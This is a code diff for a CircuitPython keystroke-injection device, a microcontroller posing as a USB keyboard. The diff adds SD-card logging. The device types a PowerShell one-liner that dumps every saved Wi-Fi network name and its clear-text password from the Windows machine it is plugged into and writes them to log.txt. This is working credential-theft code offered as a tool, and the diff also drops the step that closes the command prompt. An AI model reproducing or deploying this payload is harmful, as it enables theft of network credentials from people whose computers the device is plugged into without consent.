@@ -1,3 +1,4 @@
+import os
 import time
 import board
 import busio
@@ -5,10 +6,21 @@ import usb_hid
 import digitalio
 import displayio
 import terminalio
+import storage
+import adafruit_sdcard
 from adafruit_display_text.label import Label
 from adafruit_hid.keyboard import Keyboard, Keycode
 from adafruit_st7789 import ST7789
 from keyboard_layout_win_uk import KeyboardLayout
+
+SD_CS = board.GP17
+
+# Connect to the card and mount the filesystem.
+spi = busio.SPI(board.GP18, board.GP19, board.GP16)
+cs = digitalio.DigitalInOut(board.GP17)
+sdcard = adafruit_sdcard.SDCard(spi, cs)
+vfs = storage.VfsFat(sdcard)
+storage.mount(vfs, "/sd")
 
 # Constants for the display
 BORDER = 12
@@ -99,15 +111,13 @@ try:
     # Delay before next command
     time.sleep(0.2)
     
-    # Get all SSID
+    # Get all SSID and save to log.txt on SD card
     keyboard_layout.write('(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | % {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize > log.txt')
     keyboard.send(Keycode.ENTER)
     time.sleep(0.5)
 
-    # Exit Command Prompt
-    keyboard_layout.write('exit')
-    keyboard.send(Keycode.ENTER)
-    time.sleep(0.5)
+
+    
     
     inner_rectangle()
     print_onTFT("Files Created!!", 40, 80)
